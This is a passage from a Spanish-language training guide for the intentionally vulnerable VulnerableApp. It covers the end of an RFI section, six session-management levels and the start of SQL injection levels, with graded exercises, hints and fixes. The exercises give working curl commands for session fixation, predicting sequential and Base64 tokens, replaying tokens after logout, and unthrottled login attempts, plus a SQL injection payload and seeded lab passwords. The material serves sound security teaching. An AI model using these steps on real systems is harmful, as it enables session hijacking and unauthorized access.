Documentar el resultado como `sin solicitud al receptor` solo si la observación independiente de receiver lo confirma; nunca basarlo únicamente en el status HTTP.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar con el control positivo del nivel 2: no debe aparecer una petición nueva en receiver para esta ejecución. Verificar también que la query vista por el servidor no contiene un NUL real."
}
```

**Pistas:**

El mismo host receptor sirve para el contraste; no hace falta buscar otro endpoint ni salir del laboratorio.

La presencia de la plantilla HTML es común a ambos niveles y no es una señal de que el backend haya realizado una conexión.

**Corrección recomendada:** Sustituir el filtro de NUL por validación positiva de URL y destino, o eliminar por completo las solicitudes iniciadas con entrada del usuario. Rechazar entradas con caracteres de control y no ocultar fallos detrás de respuestas 200 vacías.

### Límites de esta familia

[
  "La revisión se limita al commit `4df80bbcd42682ecf26334f12c568e0f4a326c1a` y a la familia `rfi` más sus anotaciones/utilidades necesarias para resolver la ruta. No se modificó código ni archivos de otras familias.",
  "No existe un test JUnit, plantilla estática ni archivo `attackvectors/*RFI*` específico de esta familia en el árbol inspeccionado. La conducta y las rutas se derivan de `UrlParamBasedRFI`, de las anotaciones y de `EndPointsInformationProvider`; no se presenta como resultado de una ejecución de integración.",
  "La clase tiene `@Profile(\"unsafe\")`. Si el despliegue no activa ese perfil, la ruta puede no estar registrada; este informe no convierte un 404 de un despliegue distinto en evidencia sobre la lógica del nivel.",
  "`RestTemplate`, DNS, red Docker, versión de Java, decodificación del contenedor y política de red pueden cambiar si la llamada al receptor ocurre. En especial, el nivel 2 tiene incertidumbre por la representación y normalización de NUL/`%00`; los ejercicios lo exigen como comprobación manual.",
  "El receptor puede no devolver un marcador conocido en su raíz, por eso los `check` de los positivos son `manual` y piden correlacionar logs o panel. Un cuerpo HTML que contenga una cadena no prueba por sí mismo que hubo una solicitud saliente.",
  "El verificador sugerido es deliberadamente honesto: un reflejo de texto no prueba ejecución XSS; un `200` no prueba IDOR; y no se atribuye puntaje por hacer clic en una interfaz. Para esta familia, la señal fuerte es la evidencia independiente de una solicitud de `target` a `receiver`, acompañada de la comparación con un control negativo.",
  "Los comandos no usan shells remotos, comandos externos enviados al objetivo, lectura de secretos del host, denegación de servicio ni borrado de datos. RFI/SSRF se limita al receptor local autorizado `http://receiver:8081` y no se emplean archivos locales ni destinos de metadata."
]

## Gestión de sesiones

La familia implementa un laboratorio de gestión de sesiones en seis niveles bajo el controlador anotado como SessionManagementVulnerability. Las anotaciones @VulnerableAppRestController(value = SessionManagementVulnerability) y @VulnerableAppRequestMapping(value = LEVEL_n) se combinan con el contexto autorizado /VulnerableApp, por lo que las rutas externas son /VulnerableApp/SessionManagementVulnerability/LEVEL_n. Los niveles 1 a 5 exponen un defecto distinto; el nivel 6 es la variante segura de control. El servicio mantiene las sesiones en memoria, autentica contra session_users y devuelve respuestas GenericVulnerabilityResponseBean con los campos isValid y content.

### Todos los niveles originales

#### `POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_1/profile /VulnerableApp/SessionManagementVulnerability/LEVEL_1`

**Entrada:** {
  "login": {
    "query": "action=login",
    "json_body": {
      "username": "<usuario sembrado>",
      "password": "<contraseña sembrada>"
    },
    "cookie": "VAPP_SESSION_LEVEL1"
  },
  "logout": {
    "query": "action=logout",
    "cookie": "VAPP_SESSION_LEVEL1"
  },
  "profile": {
    "cookie": "VAPP_SESSION_LEVEL1"
  }
}

Con credenciales válidas, level1Login acepta un VAPP_SESSION_LEVEL1 suministrado por el cliente. Si el cookie entrante no está vacío, lo conserva como sesión posterior al login, guarda la asociación nivel:token y devuelve preLoginSessionId, postLoginSessionId y sessionFixationConfirmed=true. Sin cookie, crea SESSION-<contador>, comenzando en SESSION-1001 en una instancia nueva. El perfil usa el token del cookie. El logout limpia el cookie, pero la ruta de este nivel no destruye la asociación en memoria.

@AttackVector declara SESSION_FIXATION y @VulnerableAppRequestMapping declara POST y la plantilla LEVEL_1. El cookie se construye sin HttpOnly. La prueba de servicio level1Login_ShouldKeepClientSuppliedSessionId confirma que el mismo token puede consultar el perfil después de autenticar. El prefijo /VulnerableApp/ y el nombre SessionManagementVulnerability provienen de las anotaciones y del controlador central; no son rutas inferidas de la plantilla.

#### `POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_2/profile /VulnerableApp/SessionManagementVulnerability/LEVEL_2`

**Entrada:** {
  "login": {
    "query": "action=login",
    "json_body": {
      "username": "<usuario sembrado>",
      "password": "<contraseña sembrada>"
    }
  },
  "logout": {
    "query": "action=logout",
    "cookie": "VAPP_SESSION_LEVEL2"
  },
  "profile": {
    "cookie": "VAPP_SESSION_LEVEL2"
  }
}

level2Login ignora un token entrante y genera SESSION-<contador> con un AtomicInteger que empieza en 1000 y se incrementa de uno en uno; las dos primeras sesiones de una instancia limpia son SESSION-1001 y SESSION-1002. Cada token se guarda en la sesión correspondiente y se devuelve también en JSON y Set-Cookie. El perfil acepta cualquier token activo del nivel. El cookie de sesión se marca HttpOnly. El logout solo borra el cookie y no invalida la sesión de servidor.

@AttackVector declara PREDICTABLE_SESSION_ID. La prueba level2Login_ShouldGeneratePredictableSequentialSessionIds comprueba la secuencia 1001/1002. Para una demostración de acceso a otra identidad, deben generarse dos sesiones controladas con cuentas distintas del SQL semilla y probar el token vecino; no basta con ver un número con formato SESSION-n.

#### `POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_3/profile /VulnerableApp/SessionManagementVulnerability/LEVEL_3`

**Entrada:** {
  "login": {
    "query": "action=login",
    "json_body": {
      "username": "<usuario sembrado>",
      "password": "<contraseña sembrada>"
    }
  },
  "logout": {
    "query": "action=logout",
    "cookie": "VAPP_SESSION_LEVEL3"
  },
  "profile": {
    "cookie": "VAPP_SESSION_LEVEL3"
  }
}

level3Login genera SESSION-<contador> con un contador que empieza en 18920 y suma 100, y después aplica Base64 estándar. En una instancia limpia los dos primeros valores son Base64 de SESSION-19020 y SESSION-19120: U0VTU0lPTi0xOTAyMA== y U0VTU0lPTi0xOTEyMA==. El valor codificado se guarda como clave de sesión, se devuelve en JSON y se coloca en un cookie HttpOnly. El perfil consulta directamente el valor codificado recibido. El logout no invalida la sesión de servidor.

@AttackVector declara OBSCURED_PREDICTABLE_SESSION_ID. La prueba level3Login_ShouldGenerateObscuredPredictableSequentialSessionIds verifica el contador y la codificación. Base64 solo oculta el patrón; no proporciona aleatoriedad ni autenticidad. Si la instancia ya atendió logins, hay que observar/decodificar el valor actual y calcular el vecino en vez de asumir 19020.

#### `POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_4/profile /VulnerableApp/SessionManagementVulnerability/LEVEL_4`

**Entrada:** {
  "login": {
    "query": "action=login",
    "json_body": {
      "username": "<usuario sembrado>",
      "password": "<contraseña sembrada>"
    }
  },
  "logout": {
    "query": "action=logout",
    "cookie": "VAPP_SESSION_LEVEL4"
  },
  "profile": {
    "cookie": "VAPP_SESSION_LEVEL4"
  }
}

level4Login crea un UUID aleatorio, lo asocia al usuario y lo entrega en un cookie HttpOnly. level4MissingLogoutInvalidation llama a logoutWithoutInvalidation: el response borra el cookie del navegador, pero no ejecuta sessions.remove. Por ello, si se conserva el UUID antes de cerrar sesión, el endpoint /profile sigue encontrando el usuario.

@AttackVector declara MISSING_LOGOUT_INVALIDATION. La prueba level4Logout_ShouldNotInvalidateServerSideSession comprueba que el perfil sigue siendo válido después de logout. En el controlador includeProof=false, por lo que el logout HTTP no devuelve serverSessionInvalidated; la verificación debe reutilizar el token antiguo contra /profile.

#### `POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_5/profile /VulnerableApp/SessionManagementVulnerability/LEVEL_5`

**Entrada:** {
  "login": {
    "query": "action=login",
    "json_body": {
      "username": "<usuario sembrado>",
      "password": "<intento>"
    }
  },
  "logout": {
    "query": "action=logout",
    "cookie": "VAPP_SESSION_LEVEL5"
  },
  "profile": {
    "cookie": "VAPP_SESSION_LEVEL5"
  }
}

level5Login usa UUID aleatorio para los logins válidos, pero ante credenciales incorrectas siempre devuelve una respuesta 200 con isValid=false, attemptAllowed=true, rateLimitingApplied=false y el mensaje de credenciales inválidas. No mantiene contador, retraso, bloqueo ni CAPTCHA. El logout de este nivel sí elimina la sesión de servidor mediante logoutWithInvalidation.

@AttackVector declara NO_LOGIN_RATE_LIMITING. La prueba level5Login_ShouldAllowRepeatedFailedAttempts repite cuatro intentos incorrectos y espera que todos sigan permitidos. El ejercicio seguro usa cuatro intentos iguales, no una lista de contraseñas ni una campaña de fuerza bruta.

#### `POST para login/logout; no hay mapping HTTP GET /VulnerableApp/SessionManagementVulnerability/LEVEL_6/profile en esta clase /VulnerableApp/SessionManagementVulnerability/LEVEL_6`

**Entrada:** {
  "login": {
    "query": "action=login",
    "json_body": {
      "username": "<usuario sembrado>",
      "password": "<contraseña sembrada>"
    },
    "cookie": "VAPP_SESSION_LEVEL6 opcional"
  },
  "logout": {
    "query": "action=logout",
    "cookie": "VAPP_SESSION_LEVEL6"
  }
}

level6Login es la variante segura: exige un nombre no vacío, limita a tres fallos dentro de una ventana de cinco minutos por nombre de usuario, genera un UUID nuevo y, si recibió un token entrante, elimina su asociación anterior antes de guardar la nueva. Devuelve los datos del perfil junto con el nuevo sessionId y un cookie HttpOnly. logoutWithInvalidation elimina la sesión de servidor y devuelve serverSessionInvalidated=true. La interfaz segura muestra el perfil desde la respuesta de login; no existe un @GetMapping /profile para LEVEL_6.

@VulnerableAppRequestMapping usa variant=SECURE, no hay @AttackVector y la plantilla es LEVEL_6/SecureSessionManagement. SessionManagementServiceTest confirma que el token entrante no autentica, que se devuelve un token distinto, que el cuarto fallo queda bloqueado y que logout invalida. La ausencia de una ruta HTTP /profile limita la comprobación de replay exclusivamente por HTTP.

### sessionManagement-01 · Nivel 1: fijación con un token elegido por el cliente

La predicción basada en el código es que el login válido conserve VA_FIXED_SESSION, devuelva content.preLoginSessionId y content.postLoginSessionId con ese valor y content.sessionFixationConfirmed=true. Una consulta posterior a /profile con el mismo cookie debería devolver el perfil session_user si el servicio está inicializado y la sesión sigue en memoria. El control sin cookie debería producir un token SESSION-nuevo y no confirmar fijación.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El cookie se planta antes de autenticar, pero no se intenta acceder a ningún recurso externo ni a datos del host. La evidencia fuerte no es solo que Set-Cookie repita el valor: es que el perfil se puede consultar con el mismo token después del login. La comparación sin cookie ayuda a separar el comportamiento vulnerable del flujo normal.

En Kali, autenticar con el token inocuo preseleccionado: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_1?action=login' -H 'Content-Type: application/json' -H 'Cookie: VAPP_SESSION_LEVEL1=VA_FIXED_SESSION' --data '{"username":"session_user","password":"password123"}'

Reutilizar exactamente el mismo valor contra el perfil: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_1/profile' -H 'Cookie: VAPP_SESSION_LEVEL1=VA_FIXED_SESSION'

Ejecutar el control sin cookie: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_1?action=login' -H 'Content-Type: application/json' --data '{"username":"session_user","password":"password123"}' y comparar Set-Cookie y content.sessionId con el valor fijo.

Registrar solo los campos de respuesta necesarios; no hacer click para otorgar puntaje y no tratar un HTTP 200 aislado como prueba de autenticación.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

El nombre exacto del cookie es VAPP_SESSION_LEVEL1 y la acción va en la query, no en el JSON.

El perfil es GET y requiere enviar manualmente el cookie; el JavaScript de la plantilla no sustituye esta comprobación.

La aserción útil es que el token antes y después del login sea el mismo y que ese token encuentre el perfil; una cabecera Set-Cookie por sí sola no prueba acceso.

**Corrección recomendada:** No aceptar un identificador de sesión elegido por el cliente y regenerar/rotar el token tras autenticar; invalidar cualquier sesión preautenticación, usar cookies HttpOnly/Secure/SameSite según despliegue y vincular la sesión al contexto apropiado.

### sessionManagement-02 · Nivel 2: token secuencial y vecino controlado

En un proceso nuevo, el primer login predice SESSION-1001 y el segundo crea SESSION-1002. Si se prueba SESSION-1002 antes del segundo login, la respuesta prevista es No valid session found; después del segundo login, el mismo token debería resolver el perfil session_admin. Si el proceso ya atendió otros logins, se debe reemplazar 1001/1002 por el contador vecino observado; no se debe afirmar un número fijo.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El ejercicio crea dos sesiones controladas con identidades distintas y demuestra que el token vecino se puede anticipar por el contador. La respuesta exitosa del segundo perfil es evidencia de asociación de sesión; no se presenta como una prueba de IDOR ni se toca una cuenta fuera de las semillas del laboratorio.

En una instancia limpia, crear la primera sesión: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2?action=login' -H 'Content-Type: application/json' --data '{"username":"session_user","password":"password123"}' y anotar content.sessionId/Set-Cookie.

Antes de crear la segunda sesión, probar el vecino esperado como control negativo: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2/profile' -H 'Cookie: VAPP_SESSION_LEVEL2=SESSION-1002'

Crear la segunda sesión controlada: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2?action=login' -H 'Content-Type: application/json' --data '{"username":"session_admin","password":"AdminPassword@123"}'

Consultar el perfil con el token vecino: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2/profile' -H 'Cookie: VAPP_SESSION_LEVEL2=SESSION-1002'

Si el contador no empieza en 1000, observar dos tokens emitidos, usar su incremento real y repetir solo la comparación antes/después; no enumerar indefinidamente.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "session_admin"
}
```

**Pistas:**

El contador del servicio es independiente de los niveles 1 y 3, pero persiste mientras viva la instancia.

El perfil no recibe el token como parámetro: lo toma de VAPP_SESSION_LEVEL2.

Un formato SESSION-1002 no es suficiente; hay que demostrar que el token vecino estaba inactivo antes y quedó asociado después al segundo login.

**Corrección recomendada:** Generar identificadores con un CSPRNG suficiente, sin contadores observables ni transformaciones reversibles; rotar e invalidar sesiones según el ciclo de autenticación y aplicar autorización en cada recurso.

### sessionManagement-03 · Nivel 3: Base64 no oculta un contador predecible

En una instancia nueva, el primer token esperado es U0VTU0lPTi0xOTAyMA==, que decodifica a SESSION-19020; el siguiente candidato es U0VTU0lPTi0xOTEyMA==, que decodifica a SESSION-19120. El candidato debe fallar antes de la segunda creación y, tras el segundo login controlado, el perfil con ese cookie debería mostrar session_admin. En una instancia usada, los valores deben derivarse del token observado y del salto de 100.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Se usa únicamente Base64 de tokens del propio laboratorio y dos usuarios sembrados. La prueba muestra que una codificación reversible no aumenta la entropía. El control temporal del token vecino evita confundir un valor cualquiera con una sesión efectivamente creada.

Crear la primera sesión en una instancia limpia: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3?action=login' -H 'Content-Type: application/json' --data '{"username":"session_user","password":"password123"}'

Usar como control negativo el vecino codificado antes del segundo login: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3/profile' -H 'Cookie: VAPP_SESSION_LEVEL3=U0VTU0lPTi0xOTEyMA=='

Crear la segunda sesión: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3?action=login' -H 'Content-Type: application/json' --data '{"username":"session_admin","password":"AdminPassword@123"}'

Consultar el perfil con el valor Base64 vecino: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3/profile' -H 'Cookie: VAPP_SESSION_LEVEL3=U0VTU0lPTi0xOTEyMA=='

Si la instancia no es nueva, no forzar 19020/19120: observar el token, decodificarlo fuera del objetivo y aplicar el salto documentado de 100.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Decodificar content.sessionId, comprobar prefijo SESSION- y salto predecible de 100; después verificar que el token codificado vecino devuelve content.username=session_admin solo tras el segundo login"
}
```

**Pistas:**

Los valores de la instancia limpia están documentados en el test y en el payload, pero el estado en memoria puede hacerlos avanzar.

El cookie se llama VAPP_SESSION_LEVEL3 y lleva el valor codificado completo, incluidos los signos = finales.

La evidencia es asociación del token vecino con la segunda identidad; decodificar un token por sí solo solo demuestra ofuscación débil.

**Corrección recomendada:** Usar identificadores aleatorios criptográficamente seguros y no codificar contadores como sustituto de aleatoriedad; proteger el cookie con HttpOnly, Secure y una política SameSite apropiada.

### sessionManagement-04 · Nivel 4: replay del token después de logout

El código predice un UUID nuevo en login. Logout debería devolver Set-Cookie con Max-Age=0, pero el replay del UUID capturado contra /profile debería seguir devolviendo el perfil session_user porque level4 usa logoutWithoutInvalidation. La cabecera que borra el cookie no demuestra por sí sola invalidación del estado de servidor.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El token se conserva solo para esta demostración dentro del laboratorio y se reutiliza una vez, sin acceder a secretos. Se contrasta el efecto de borrar el cookie con el efecto que debería tener destruir la sesión de servidor.

Iniciar sesión y copiar el UUID de Set-Cookie o content.sessionId: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_4?action=login' -H 'Content-Type: application/json' --data '{"username":"session_user","password":"password123"}'

Cerrar sesión enviando el UUID copiado: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_4?action=logout' -H 'Cookie: VAPP_SESSION_LEVEL4=<token_guardado>'

Reprobar el token antiguo, no el cookie vacío: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_4/profile' -H 'Cookie: VAPP_SESSION_LEVEL4=<token_guardado>'

Como control de transporte, repetir /profile sin Cookie y confirmar que no hay sesión; esto solo demuestra que el cookie es necesario, no que logout haya revocado el token antiguo.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "session_user"
}
```

**Pistas:**

El controlador no incluye serverSessionInvalidated en la respuesta de logout de LEVEL_4; la prueba relevante es el replay.

No sustituyas <token_guardado> por el valor vacío que envía Set-Cookie al cerrar sesión.

Un 200 no basta: exige isValid=true y un perfil coherente en la respuesta de replay.

**Corrección recomendada:** En logout, eliminar la asociación server-side antes o junto con la expiración del cookie, rotar tokens en cambios de privilegio y aplicar expiración/inactividad y revocación del lado del servidor.

### sessionManagement-05 · Nivel 5: cuatro intentos iguales sin rate limiting

La predicción de level5Login es que cada uno de los cuatro POST devuelva HTTP 200 pero JSON con isValid=false, content.attemptAllowed=true y content.rateLimitingApplied=false. No se intenta descubrir la contraseña real ni se continúa después de cuatro solicitudes.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Es una prueba de control de volumen mínimo, no un ataque de fuerza bruta: usa el mismo marcador de contraseña cuatro veces y se detiene. El resultado significativo es que el propio JSON declara que el intento sigue permitido y que no se aplicó limitación.

Primer intento controlado: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Segundo intento idéntico: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Tercer intento idéntico: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Cuarto y último intento: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Comparar los cuatro JSON y detenerse; no usar wordlists, paralelismo, retrasos artificiales ni contraseñas reales.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "false"
}
```

**Pistas:**

La cuenta session_rate_limit_victim y su contraseña legítima están en el SQL de semilla, pero la contraseña legítima no es necesaria para este ejercicio.

Usa content.attemptAllowed y content.rateLimitingApplied, no solo el código de estado.

El control positivo correspondiente es LEVEL_6, donde el cuarto fallo para el mismo username debe quedar bloqueado dentro de cinco minutos.

**Corrección recomendada:** Aplicar rate limiting por cuenta y señales de origen, backoff progresivo, bloqueo temporal cuidadosamente diseñado, alertas y CAPTCHA adaptativo; almacenar contadores de forma consistente y no filtrar si una cuenta existe.

### sessionManagement-06 · Nivel 6 seguro: regeneración de token y logout con invalidación

La predicción del código es que login devuelva un UUID nuevo distinto de VA_PRELOGIN_MARKER, los datos del perfil y Set-Cookie con HttpOnly. Al enviar ese UUID a logout, la respuesta debería contener content.serverSessionInvalidated=true y borrar el cookie. No se debe intentar /LEVEL_6/profile: esa ruta no está mapeada HTTP.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Es el control positivo frente a LEVEL_1 y LEVEL_4: el token entrante no se conserva y el logout elimina la sesión server-side. La diferencia del token debe revisarse manualmente en login; la aserción automática propuesta se aplica a la respuesta final de logout.

Enviar un marcador de prelogin y credenciales válidas: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' -H 'Cookie: VAPP_SESSION_LEVEL6=VA_PRELOGIN_MARKER' --data '{"username":"session_user","password":"password123"}'

Comprobar manualmente que content.sessionId y Set-Cookie contienen un UUID distinto de VA_PRELOGIN_MARKER y que Set-Cookie incluye HttpOnly; copiar solo el nuevo UUID.

Cerrar sesión con el UUID nuevo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=logout' -H 'Cookie: VAPP_SESSION_LEVEL6=<nuevo_UUID>'

Verificar content.serverSessionInvalidated=true y Max-Age=0 en Set-Cookie; no convertir la ausencia de /profile en un resultado de replay HTTP.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

El login seguro devuelve el perfil en content; no hace una segunda llamada HTTP a /profile.

La comparación importante es nuevo_UUID != VA_PRELOGIN_MARKER, no que el UUID tenga un formato particular.

HttpOnly se comprueba en la cabecera Set-Cookie; no se puede demostrar con document.cookie desde la plantilla.

**Corrección recomendada:** Mantener la estrategia del nivel 6: regenerar tokens al autenticar y cambiar privilegios, invalidar la sesión anterior, usar cookies protegidos, revocar en logout y devolver el mínimo de datos necesario.

### sessionManagement-07 · Nivel 6 seguro: control positivo de bloqueo tras tres fallos

En una ventana nueva de cinco minutos para ese username, los tres primeros fallos deberían devolver failedAttempts 1, 2 y 3 con rateLimitingApplied=true; el cuarto debería devolver loginBlocked=true, rateLimitingApplied=true y el mensaje de demasiados intentos. Esto contrasta directamente con los cuatro intentos permitidos en LEVEL_5.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Solo se generan cuatro solicitudes idénticas y se usan datos de laboratorio. El contador es por username, vive en memoria y tiene TTL de cinco minutos; por eso una ejecución anterior puede dejar el usuario ya bloqueado y debe anotarse, no interpretarse como cuatro respuestas nuevas.

Primer fallo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Segundo fallo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Tercer fallo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Cuarto intento, que debe activar el bloqueo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{"username":"session_rate_limit_victim","password":"VA_WRONG_TRAINING_GUESS"}'

Comparar los campos JSON del cuarto intento con LEVEL_5 y detenerse; no cambiar de usuario para rodear el límite ni lanzar más solicitudes.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

La clave del contador es el username y el bloqueo se comprueba antes de volver a consultar el repositorio.

Si el cuarto intento ya está bloqueado al comenzar, reiniciar únicamente la instancia aislada o anotar que el estado en memoria ya existía; no ampliar la prueba.

La evidencia positiva es loginBlocked=true, no la latencia ni el código 200.

**Corrección recomendada:** Conservar un límite server-side con ventana y backoff, protegerlo frente a reinicios/distribución, registrar eventos sin revelar credenciales y combinarlo con controles de cuenta y origen.

### Límites de esta familia

[
  "La revisión corresponde al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y documenta el código, recursos y tests leídos; no afirma que los comandos hayan sido ejecutados contra target ni que una respuesta observada haya sido exitosa.",
  "Los tokens, sesiones y contadores viven en memoria del proceso. Los valores SESSION-1001/1002 y Base64(SESSION-19020/19120) solo son reproducibles al iniciar una instancia limpia; después deben sustituirse por los valores observados y por el incremento documentado.",
  "El SQL de semilla contiene las cuentas session_user, session_attacker, session_admin y session_rate_limit_victim. El informe usa únicamente esas credenciales de laboratorio y marcadores de contraseña incorrecta; no intenta descubrir secretos ni leer archivos del host.",
  "LEVEL_6 no tiene un mapping HTTP GET para /profile. La prueba de servicio confirma la semántica de invalidación, pero por HTTP solo puede comprobarse la rotación, los datos devueltos, la cabecera del cookie, el resultado explícito de logout y el bloqueo de login.",
  "Un HTTP 200 no prueba autenticación, invalidación ni control de acceso: hay que parsear isValid y los campos de content. Un Set-Cookie que borra el navegador tampoco demuestra que el token antiguo haya sido revocado.",
  "Para un verificador honesto, un reflejo de texto no prueba ejecución XSS, un 200 no prueba IDOR y no se debe atribuir puntaje porque una persona haga click. En esta familia la evidencia debe ser la transición de estado y los campos JSON/cookies indicados, no una interacción visual.",
  "Los objetos check usan kind contains, not_contains, header, json o manual; en los checks json, path es una ruta de campos separada por puntos (por ejemplo content.loginBlocked). Un verificador debe tratar ausencia, JSON inválido, cookie faltante y respuestas 5xx como resultado inconcluso, no como hallazgo automático.",
  "Los ejercicios son deliberadamente pequeños y secuenciales: no incluyen comandos ejecutados por el objetivo, reverse shells, lecturas de secretos, acceso a rutas de archivos, denegación de servicio, borrado de datos ni llamadas a servicios distintos del laboratorio autorizado."
]

## Inyección SQL y controles de consultas

Esta familia contiene tres controladores REST que consultan la tabla cars usando el parámetro de consulta id. La anotación VulnerableAppRestController aporta el nombre del controlador y VulnerableAppRequestMapping aporta LEVEL_n; junto con el context-path /VulnerableApp, las rutas resultan /VulnerableApp/{nombre}/{LEVEL}. La anotación de nivel deja GET como método predeterminado. Los niveles iniciales concatenan entrada no confiable en SQL (inyección directa o dentro de una cadena); los niveles posteriores muestran eliminación de comillas, validación de tipo, PreparedStatement, parámetros con nombre y consultas JPA/repositorio. La demostración segura usa únicamente filas conocidas de cars (Audi/BMW), expresiones booleanas sin efectos laterales y errores sintácticos controlados: no usa INSERT, UPDATE, DELETE, DDL, llamadas a funciones externas, lectura de secretos, archivos, red ni técnicas de denegación de servicio.

### Todos los niveles originales

#### `GET /VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Lee id de un Map recibido por @RequestParam y concatena `select * from cars where id=` + id. Devuelve HTTP 200 y el JSON booleano { "isCarPresent": true } si el ResultSet tiene una fila, o { "isCarPresent": false } si no la tiene.

UNSECURE por defecto. La condición puede alterarse con una expresión booleana; no se muestra la fila, solo un oráculo true/false. Una entrada sintácticamente inválida puede propagar una excepción porque este método no captura el error. El test unitario verifica ambas ramas con un ResultSet simulado y el test de base de datos verifica que 999 OR id=2 selecciona BMW.

#### `GET /VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Concatena `select * from cars where id='` + id + `'` y conserva el mismo oráculo booleano HTTP 200 que el nivel 1. La entrada queda dentro de un literal SQL, pero las comillas de la entrada pueden cambiar la estructura de ese literal.

UNSECURE por defecto. El payload original propone expresiones como 100'OR '1'='1; el ejercicio usa una variante equivalente y solo consulta cars. El método tampoco captura excepciones SQL, por lo que la forma exacta del estado HTTP para un payload malformado depende del manejo global de errores.

#### `GET /VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Construye `select * from cars where id=?`, usa PreparedStatement y enlaza id con setString. Conserva el oráculo true/false y normalmente HTTP 200.

Está marcado Variant.SECURE. Los caracteres SQL se tratan como datos y no como parte de la consulta. El test unitario verifica la rama de PreparedStatement; el test de base de datos no observa fuga de BMW ni de usuarios para payloads de control.

#### `GET /VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_4`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Exige que id coincida con `\d+`; si no, responde HTTP 400 con `Invalid ID format.`. Para un id numérico concatena `select * from cars where id=` + id y devuelve el oráculo booleano.

Está marcado Variant.SECURE. La concatenación queda acotada por validación numérica, aunque la práctica defensiva preferible sigue siendo parametrizar. La respuesta 400 es una señal de validación, no una prueba aislada de ausencia de toda vulnerabilidad.

#### `GET /VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_5`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Convierte id con Integer.parseInt y busca CarInformation por EntityManager.find. Una fila encontrada produce HTTP 200 con isCarPresent=true; una fila inexistente produce HTTP 404 con isCarPresent=false.

